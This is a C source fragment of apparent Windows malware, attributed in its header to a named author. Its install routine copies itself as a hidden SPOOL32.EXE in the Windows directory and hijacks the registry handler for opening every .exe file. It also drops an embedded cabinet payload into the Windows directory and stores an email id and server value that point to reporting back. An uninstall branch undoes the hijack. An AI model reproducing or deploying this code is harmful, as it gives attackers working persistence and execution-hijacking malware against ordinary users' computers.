//////////////////////////////////////////////////////////////////////////
//		Coded by   Hirosh ,India										//
//////////////////////////////////////////////////////////////////////////
//					MSN hirr@hotmail.com								//	
//					yahoo hirosh22@yahoo.com							//
//					ICQ 109619370										//
//					Email :hirhirhir@hotpop.com							//	
//					www.hirosh.tk									//
//////////////////////////////////////////////////////////////////////////
//	I am the one mad from india	!!!!!!!									//	
//////////////////////////////////////////////////////////////////////////


void install(BOOL bb)
{
char ln[MAX_PATH];
char ss1[MAX_PATH+5];
char ss2[MAX_PATH+5];
HKEY childkey = 0 ;
DWORD dispos ;
char a[MAX_PATH];
if(bb){
GetModuleFileName(NULL,ln,MAX_PATH);
	GetWindowsDirectory(ss2,MAX_PATH);
	lstrcat(ss2, "\\SPOOL32.EXE" ); 
	GetModuleFileName(NULL,ln,MAX_PATH);
	CopyFile (ln,ss2,FALSE);
	SetFileAttributes (ss2,FILE_ATTRIBUTE_HIDDEN);
	GetWindowsDirectory(ss2,MAX_PATH);
	lstrcat(ss2, "\\SPOOL32" ); 
wsprintf(ss1,"\"%s\" %%1 %%*",ss2); 
RegCreateKeyEx (HKEY_CLASSES_ROOT, "exefile\\shell\\open\\command", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_CREATE_SUB_KEY | KEY_ALL_ACCESS, NULL, &childkey, &dispos ) ;
RegSetValueEx ( childkey, NULL, 0, REG_SZ, ( const BYTE* ) ( LPCTSTR ) ss1,lstrlen(ss1) ) ;
RegCloseKey ( childkey );
/////////////
	childkey = 0 ;
	RegCreateKey(HKEY_LOCAL_MACHINE, ( LPCTSTR ) "Software\\innsoft", &childkey );  
	RegSetValueEx ( childkey, ( LPCTSTR )"innss" ,0, REG_SZ, ( const BYTE* ) ( LPCTSTR ) "1",1) ;
	RegCloseKey ( childkey );
////////////////////////////
	HRSRC hResLoad;   
	HRSRC hRes;       
	char *lpResLock;  
	HMODULE hModule;
	hModule = GetModuleHandle (NULL);
	hRes = FindResource(hModule,MAKEINTRESOURCE(IDR_DATA8), RT_RCDATA); 
	hResLoad = (HRSRC)LoadResource(NULL, hRes); 
	DWORD si,dwBytes; 
	si=SizeofResource(NULL,hRes);
	lpResLock = (char *)LockResource(hResLoad);
	HANDLE  hFile = CreateFile ("c:\\uuu.cab", GENERIC_WRITE,0, NULL, CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile (hFile, (LPVOID)lpResLock, si, &dwBytes, NULL);
	CloseHandle (hFile);
/////////////
	GetWindowsDirectory(a,MAX_PATH);	lstrcat(a, "\\" ); 
	IterateCabinet("c:\\uuu.cab",a);
	DeleteFile("c:\\uuu.cab");
RegCreateKey(HKEY_LOCAL_MACHINE, ( LPCTSTR ) "Software\\innsoft", &childkey );  
RegSetValueEx (childkey, ( LPCTSTR )"emid" ,0, REG_SZ, ( const BYTE* ) ( LPCTSTR )emailid,lstrlen(emailid)) ;
RegSetValueEx (childkey, ( LPCTSTR )"server" ,0, REG_SZ, ( const BYTE* ) ( LPCTSTR )server,lstrlen(server)) ;
RegCloseKey ( childkey );
}
else
{
lstrcpy(ss1,"\"%1\" %*"); 
RegCreateKeyEx (HKEY_CLASSES_ROOT, "exefile\\shell\\open\\command", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_CREATE_SUB_KEY | KEY_ALL_ACCESS, NULL, &childkey, &dispos ) ;
RegSetValueEx ( childkey, NULL, 0, REG_SZ, ( const BYTE* ) ( LPCTSTR ) ss1,lstrlen(ss1) ) ;
RegCloseKey ( childkey );
///////////
RegOpenKeyEx(HKEY_LOCAL_MACHINE, ( LPCTSTR ) "SOFTWARE\\innsoft",0,KEY_ALL_ACCESS, &childkey );
RegDeleteValue(childkey,"emid");
RegDeleteValue(childkey,"server");
RegDeleteValue(childkey,"innss");
RegCloseKey(childkey);
RegOpenKeyEx(HKEY_LOCAL_MACHINE, ( LPCTSTR ) "SOFTWARE",0,KEY_ALL_ACCESS, &childkey );
RegDeleteKey(childkey,"innsoft");
RegCloseKey(childkey);
}
}
